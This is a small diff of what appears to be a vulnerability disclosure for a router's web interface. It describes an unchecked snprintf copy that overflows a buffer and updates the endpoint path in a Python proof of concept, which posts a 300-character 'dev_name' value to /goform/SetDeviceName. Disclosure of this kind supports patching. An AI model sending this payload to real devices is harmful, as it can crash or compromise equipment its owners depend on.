@@ -29,7 +29,7 @@ finally call snprint ,dont check the length ,cause buff overflow
 
 ## POC
 ```
-url = "http://192.168.1.13/goform/formSetDeviceName"
+url = "http://192.168.1.13/goform/SetDeviceName"
 payload = 'A'*300 + '\n'
 
 r = requests.post(url, data={'dev_name': payload})
